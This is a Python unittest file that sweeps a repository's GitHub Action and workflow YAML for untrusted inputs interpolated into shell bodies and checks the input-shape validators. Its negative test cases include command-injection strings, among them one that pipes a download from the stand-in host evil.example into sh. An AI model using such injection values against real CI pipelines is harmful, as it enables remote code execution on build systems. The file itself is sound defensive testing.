"""No externally controlled value is interpolated into a shell body — register entry N16.

GitHub splices a `${{ }}` expression into the script TEXT before bash ever sees it. A value
carrying a quote or a semicolon therefore stops being data and becomes script. The safe form
is an `env:` binding, where the value reaches bash as a variable.

The finding this file closes stood one line above its own solution: the action's run step
routed `inputs.command` through `env:` and said why in a comment, while the step directly
above interpolated `inputs.version` and `inputs.extras` into the shell body.

So this is a SWEEP, not a case about one file: every action and every workflow in the tree
is examined, because a fix that only covers the place the finding named leaves its
neighbours open — and the neighbour here was one step away.
"""
import re
import unittest
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[1]

# Expression prefixes an attacker can influence. `github.event.*` and `inputs.*` are the
# two GitHub's own hardening guidance names first; `head_ref` is the classic pull-request
# case, where a branch name is attacker-chosen text.
GEFAEHRLICH = re.compile(
    r"\$\{\{\s*(inputs\.|github\.event\.|github\.head_ref|env\.GITHUB_HEAD_REF)", re.I)


def yaml_dateien() -> list[Path]:
    orte = [REPO / "action", REPO / ".github" / "workflows"]
    d: list[Path] = []
    for o in orte:
        if o.is_dir():
            d += sorted(o.rglob("*.yml")) + sorted(o.rglob("*.yaml"))
    return d


def run_bloecke(datei: Path):
    """Yield (step name, run body) for every step that carries a shell body."""
    try:
        doc = yaml.safe_load(datei.read_text(encoding="utf-8"))
    except yaml.YAMLError as exc:
        raise AssertionError(f"{datei} is not valid YAML: {exc}") from exc
    if not isinstance(doc, dict):
        return
    schritte = []
    runs = doc.get("runs")
    if isinstance(runs, dict):
        schritte += runs.get("steps") or []
    for job in (doc.get("jobs") or {}).values():
        if isinstance(job, dict):
            schritte += job.get("steps") or []
    for s in schritte:
        if isinstance(s, dict) and isinstance(s.get("run"), str):
            yield s.get("name", "(unnamed)"), s["run"]


class TestKeineEinspeisungInEinenShellBody(unittest.TestCase):
    def test_es_gibt_ueberhaupt_etwas_zu_pruefen(self):
        """A sweep over an empty set is green and says nothing."""
        dateien = yaml_dateien()
        self.assertGreater(len(dateien), 1, "no action or workflow files found to sweep")
        self.assertTrue(any(any(True for _ in run_bloecke(d)) for d in dateien),
                        "no run blocks found — the sweep would pass vacuously")

    def test_KEINE_datei_interpoliert_eine_fremde_eingabe_in_einen_run_body(self):
        treffer = []
        for d in yaml_dateien():
            for name, body in run_bloecke(d):
                for m in GEFAEHRLICH.finditer(body):
                    zeile = body[:m.start()].count("\n") + 1
                    treffer.append(f"{d.relative_to(REPO)} · step {name!r} · run line {zeile}: "
                                   f"{m.group(0)}…")
        self.assertEqual(treffer, [], "externally controlled value interpolated into a shell "
                                      "body — route it through env: instead:\n  " +
                                      "\n  ".join(treffer))

    def test_die_action_fuehrt_ihre_drei_eingaben_ueber_env(self):
        """The specific instance, bound by effect rather than by reading the comment."""
        doc = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
        env_werte = set()
        for s in doc["runs"]["steps"]:
            for v in (s.get("env") or {}).values():
                env_werte.add(str(v))
        for feld in ("inputs.command", "inputs.version", "inputs.extras"):
            self.assertTrue(any(feld in v for v in env_werte),
                            f"{feld} does not travel through any env binding")

    def test_META_der_sweep_faengt_eine_eingepflanzte_einspeisung(self):
        """Without this the sweep could be green because its pattern matches nothing.

        An absence check that has never seen a presence cannot be told from one that
        always passes.
        """
        gepflanzt = 'echo "${{ inputs.version }}"'
        self.assertTrue(GEFAEHRLICH.search(gepflanzt))
        for harmlos in ('echo "${{ github.sha }}"',
                        'echo "$PB_VERSION"',
                        'echo "${{ runner.os }}"'):
            with self.subTest(harmlos=harmlos):
                self.assertIsNone(GEFAEHRLICH.search(harmlos),
                                  "a value the attacker does not control must not be flagged")


class TestFormpruefungDerEingaben(unittest.TestCase):
    """env: alone is secure only until someone rewrites the step. The shape check survives."""

    ERLAUBT_VERSION = re.compile(r"^[=<>!~]{1,2}[A-Za-z0-9._*+!-]+$")
    ERLAUBT_EXTRAS = re.compile(r"^[A-Za-z0-9._-]+(,[A-Za-z0-9._-]+)*$")

    def test_die_action_prueft_beide_eingaben_auf_ihre_form(self):
        text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
        self.assertIn("is not a PEP 440 specifier", text)
        self.assertIn("is not a comma-separated list of names", text)

    def test_die_erlaubten_formen_nehmen_echte_werte_an(self):
        for gut in ("==6.0.0", ">=6.0", "~=6.0.1", "==6.0.0rc1"):
            with self.subTest(v=gut):
                self.assertRegex(gut, self.ERLAUBT_VERSION)
        for gut in ("eval", "eval,inspect", "dev-tools"):
            with self.subTest(e=gut):
                self.assertRegex(gut, self.ERLAUBT_EXTRAS)

    def test_die_erlaubten_formen_weisen_die_einspeisung_ab(self):
        for boese in ('==1.0.0"; curl evil.example/x | sh; echo "',
                      "==1.0.0 $(id)", "==1.0.0`id`", "; id", "==1.0.0\nid"):
            with self.subTest(v=boese):
                self.assertNotRegex(boese, self.ERLAUBT_VERSION)
        for boese in ("eval; id", "eval$(id)", "eval inspect", "eval,"):
            with self.subTest(e=boese):
                self.assertNotRegex(boese, self.ERLAUBT_EXTRAS)


if __name__ == "__main__":
    unittest.main(verbosity=2)
